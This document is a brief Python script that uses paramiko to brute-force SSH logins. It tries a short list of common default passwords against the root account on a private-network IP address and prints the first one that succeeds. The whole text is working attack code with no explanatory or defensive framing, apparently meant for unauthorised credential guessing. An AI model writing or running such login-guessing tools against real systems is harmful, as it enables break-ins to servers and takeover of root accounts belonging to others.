import paramiko

host = "192.168.100.84"
username = "root"
passwords = ["123456", "root", "admin", "password"]

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for password in passwords:
    try:
        ssh.connect(host, username=username, password=password, timeout=3)
        print(f"[+] Success with password: {password}")
        ssh.close()
        break
    except:
        print(f"[-] Failed: {password}")

